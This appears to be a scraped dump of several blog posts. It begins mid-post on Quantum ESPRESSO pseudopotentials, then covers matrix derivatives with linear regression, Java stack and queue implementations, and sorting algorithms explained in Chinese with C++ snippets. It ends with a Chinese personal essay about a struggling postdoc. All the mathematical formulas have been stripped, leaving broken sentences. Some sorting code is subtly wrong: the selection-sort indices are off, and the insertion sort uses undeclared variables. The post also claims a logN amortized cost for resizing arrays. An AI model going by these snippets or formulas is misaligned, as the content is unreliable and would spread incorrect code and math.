terms are call local and nonlocal terms of the pseudopotentials, respectively, and is an arbitrary wavefunction. In terms of technical details, the local part is applied to wavefunctions in real space. To compute the local part, please check PHonon/PH/setlocq.f90. Here, we focus on the nonlocal part, because it is much tricky compared to the local part. In general, the nonlocal part can be written as where the are basis functions of the pseudopotential and the matrix is the contribution of each part of basis function. For many pseudopotentials, the matrix is diagonal. In terms of codes, the information about a pseudopotential can be found in 1QE_ROOT/Modules/uspp.f90 In this file, the module uspp contains the following parameters, vkb the basis function (beta); dvan the contribution matrix (D matrix). Derivative of pseudopotentialsTo implement phonons, we have to compute derivatives of pseudopotentials as the perturbation. A paper on how to write the derivatives can be found in Andrea Dal Corso’s paper Phys. Rev. B 64, 235118 . The paper talks about the derivatives within the framework of ultrasoft pseudopotentials, which is a generalization of norm-conserving pseudopotentials. Eq. (B29) in this paper is what we really implement in codes.

posts.title: A short summary of vector and matrix derivatives
posts.text: Matrix derivative has been an essential technique in statistical learning. Yet, this topic is usually not covered in a typical linear algebra lecture. Here, I summarized typical properties and tricks that are often helpful when computing matrix derivatives. ConventionsBefore discussing the properties and skills used in matrix derivatives, we start with the definition of the derivatives. We will use lowercase letters for scalar, e.g. , lowercase letters with arrow hat for column vectors, e.g. , and uppercase for matrices, e.g. . Definition of derivative We start the discussion of matrix derivative by taking a close look at the derivative of a scalar function with respective to a vector. Given a scalar function of a vector , the derivative with respect to is defined asThe differential of can be written as, TheoremThe differential of a scalar function of matrix with respective to matrix can be written as where represents the trace of a matrix. We are not going to prove this definition, however, we can easily see that this definition applies both to derivative to vectors and matrices. As shown above, we defined the differential rather than the derivative of a function. Why? Because we can take advantages of the properties of traces so that we are able to find derivatives of complex functions without worrying about dimensionalities of vectors or matrices. Properties of tracesHere are useful properties of the trace of matrices where , , are matrices; is a number; and is element-wise multiplication. ExamplesHere is an example how to apply the technique above. Linear regressionGiven samples where , we are going to train the linear model, where are coefficients. We are trying to minimize the error between the prediction and true values (a.k.a. cost function), where is Euclidean-norm. Now define matrix and vector , and we can rewrite the cost function as To minimize the cost function, we want find such that . To find the derivative, we firstly compute differential of cost function thus, Let , we can easily solve for , Notes:To implement linear regression, people usually prefer not to use this equation (known as normal equation of linear regression), because 1) might not be an invertible matrix; 2) it might be expensive to inverse the matrix. So, people usually try to obtain by optimizing an initial guess using optimization techniques.

posts.title: Basic Data Structures, Stack and Queue
posts.text: Stacks and Queues are basic data structures that have been widely used. The former has last-in-first-out (LIFO) accessing order while the latter has first-in-first-out (FIFO) order. We will discuss the APIs that these data structures should at least have and how to implement them. Stack APIDetailed descriptions are: Stack( ): default constructor; push( Item ): push/add one element to the top return type: void top( ): access the top element return type: Item pop( ): Remove the element on the top. return type: Item isEmpty( ): If the stack is empty. return type: boolean size( ): Number of elemenets in the stack. return type: int To implement the stack, we must have an underlying container to hold the elemenets in the stack. Usually, people pick up the container from linked list and resizing array. Either has pros and cons. Linked list StackA typical linked list looks like the following in Java 12345678910public class Node<Item>{ public Item val; public Node<Item> next; public Node(Item elem) { val = elem; next = null; }} In a stack, we will have a root node. Each time adding or removing one element from the stack, we add or remove from the begining by modifying the root node. 12345678910111213141516171819public class Stack<Item>{// ... private Node<Item> root; public void push(Item elem) { Node<Item> newroot = new Node<Item>(elem); newroot.next = root; root = newroot; } public Item pop() { // make sure the stack is not empty Item elem = root.val; root = root.next; return elem; }// ...} By doing so, the push() and pop() methods are done at constant cost. However, linked list implementation always requires extra memory to contain the data. For data set with every large size, available memory might not be enough. Resizing Array StackTo solve the problem mentioned above, an alternative way is to implement stacks with resizing arrays. When declare arrays, we have to specify the length of the array. So, we implement the following technique. When the current array is full, we double the size of the array. When the number of elements in the array is smaller than 1/4 of the capacity of the array, we reduce the capacity to its half. With the technique described above, the amortized cost to contain N elements will be logN.When pushing elements to the stack, we push to the end; when poping from the stack, we pop from the end. 12345678910111213141516171819202122232425262728293031323334public class Stack<Item>{ private Item[] elems; private int capacity; // capacity of the stack for now private int count; // number of elements in the stack for now // ... public void push(Item elem) { elems[count++] = elem; // if full, double capacity if ( count == capacity ) this.resize(2*capacity); } public Item pop() { Item elem = elems[--count]; if ( count <= capacity/4 ) this.resize(capacity/2); return elem; } // resize the array private void resize(int newcapacity) { // allocate generic array Item[] newelems = (Item[]) new Object[newcapacity]; for ( int i = 0; i < count; i++ ) newelems[i] = elems[i]; elems = newelems; capacity = newcapacity; } // ...} Queue APIA queue is very similar to a stack except that queues have different accessing order. We can also implement queues with linked lists and resizing arrays. If linked lists are used, we push to the front, while pop from the end. In this case, adding elements still has constant cost while dequeue() method has O(N) complexity. If arrays are used, we push to the end, while pop from the front. The complexity of array queue is the same as array stacks. The codes are not shown here, but can be found in linked-list queue and resizing-array queue.

posts.title: 常见排序算法
posts.text: 复杂度为$O(N^2)$的几种算法符合此种复杂度的排序算法最为直观。以下介绍冒泡排序(Bubble sort)，选择排序(Selection sort), 插入排序(Insertion sort) 冒泡排序(Bubble sort)两个指针同时扫，每当右指针数值小于左指针，则交换之。 12345678910// vector<int> arr has been declared and initialized;for ( unsigned i = 0; i < arr.size()-1; i++ ){ for ( unsigned j = i+1; j < arr.size(); j++ ) { if ( arr[j] < arr[i] ) // swap has been defined else where swap( arr[i], arr[j] ); }} 选择排序(Selection sort)两个指针i, j同时扫遍数组，右侧指针始终查找i之后所有元素中的最小值。若该最小值小于i位上的值，则交换之。 1234567891011// vector<int> arrfor ( unsigned i = 0; i < arr.size()-1; i++ ){ unsigned minIndex = i+1; for ( unsigned j = 0; j < arr.size(); j++ ) { if ( arr[j] < arr[minIndex] ) minIndex = j; } swap(arr[i], arr[minIndex]);} 插入排序(Insertion sort)两个指针从右向做扫遍数组。对于每一个右指针，左指针向前寻找到存放右指针数值的正确位置，并插入之。 123456789101112// vector<int> arr;for ( int j = arr.size()-1; j >= 1; j-- ){ int val = arr[j]; for ( int i = j-1; i >= 0; i-- ) { // i could be -1, so use int not unsigned if ( a[i] > val ) a[i+1] = a[i]; } a[i+1] = val;} 对于已经大致排序好的数组，插入排序的复杂度可能达到接近O(N)的水平。但是，如果是已经完全逆向排序好的数组，插入排序的表现甚至比选择排序要差。 复杂度为$O(Nlog N)$的几种算法常见的N log(N)算法有合并排序(Merge sort)，快速排序(Quick sort)和堆排序(Heapsort)。此处介绍合并排序和快速排序，堆排序将在优先队列中提及。合并排序和快速排序都有分治法的思想(Divid-and-conquer)。合并排序的优点在于稳定性，缺点在于非原位，因而需要额外内存。 快排不需要额外内存，原位地(in-place)排序。但快排丢失了稳定性。就效率来说，虽然二者都是NlogN的复杂度，但是平均来说快排还是要比合并排序和堆排序要快一些。 合并排序合并排序将数组不断划分为左右两个部分，然后对左右两部分再进行划分直至当前处理的数组只包含一到两个数值，此时可以直接返回，或者交换数值再返回。一旦左右两部分排序完成并返回后，此时对左右两侧进行合并。这正是合并排序名称的由来。假定数组中存在N个元素，则进行上述划分的操作至多不超过log2(N)次。 代码详见：Merge sort in C++ 快速排序快速排序首先从数组中选择一个数值作为参照物，然后对当前数组进行调整，使得参照物回到正确位置上，即该数左侧所有数值都应小于参照物，右侧所有数值都应大于参照物。但此时左右两个部分内部的顺序依然没有排定，因此对左右两个部分分别再进行上述操作。 代码详见：Quick sort in C++ 复杂度介于$O(N^2)$和$O(NlogN)$之间的排序希尔排序(Shell sort)此种排序采用了与插入排序类似的思想。上面提到，插入排序对于已经大致排好序的数组效率较高。同时插入排序可以视作是一种间距为1的排序，即每个数与其相聚为1的数进行比较。Shell排序采用如下策略，首先对用一个大间隔进行排序，然后逐步缩小间隔至1，此时就蜕化成了普通的插入排序。由于此时数组已经大致排好序，因此插入排序的表现也会比较好。 然后，采用何种间隔进行希尔排序以达到最好效果还难以明确。常用的是下面的序列，1, 4, 13, 40, 121, …f(n) = 3f(n-1) + 1 代码详见Shell sort in C++

posts.title: 长我十岁的林博士，好运
posts.text: 一我早已记不清第一次见到林博士的场景，但他那时必然含着欧洲味的英语，戴着仿佛不属于这个世纪的鸭舌帽吧。 二我这个人，有点邪恶。每每组里有新来的博后，我都要在google scholar, linkedin之类的网站上将其调查一番，然后预估一下此人的水平。我记得林博士是有若干PRL的，于是我很奇怪，林博士为什么要开启第二段博后旅程。 三我当年的candidacy exam似乎就在林博士到来不久。手握PRL，拥有大牛导师，可是林博士竟然找不到教职。于是林博士的到来让我对我的candidacy有了不同的认知。哦，对了，那时有位来自北大的博士生跳下了金门大桥。我猜你肯定不知道我说的是哪一位，我们博士生就是这么卑微，甚至留不下微漠的悲哀。 四林博士是有孩子的，他的孩子甚至在幼儿园中因为跟华人小孩打架而学会了用汉语喊救命。林博士提起孩子时仿佛自己也成了孩子。他的爱人也是博士，可是竟然找不到工作。于是林博士要用他的博后工资喂饱三张嘴。慢，未必，作为长兄的他还需要周济他的几个弟妹。 五我是同林博士一起去开物理年会的。林博士问我，咱们在外的餐费是可以报销的吧。我说，穷家富路。他说，他的钱都要省给他儿子。那是我第一次去加州，第一次去LA. 六林博士的好友已经是在物理年会上做特邀演讲的副教授了。他与好友饮酒归来，眼中血丝密布。他问我，你比我小整整十岁，十年后你想不想和我今天一样？无言。。 七林博士终于下定决心要离开风城了，毕竟他的妻、子已经在大洋彼岸等待他多时了。最后的最后，他还想挣扎一下，他竟要带着儿子去澳大利亚做第三期博后。我打趣，你老婆肯定会把你踹了的。还好，林博士最后还是与妻子相聚了。 八老板，小老板似乎并不认可林博士的科研能力，提及林博士的科研结果，眉宇间的变化，难以言说，不可言说。我与林博士并没有课题上的合作。不过，林博士比我聪明。 九林博士，祝你好运！
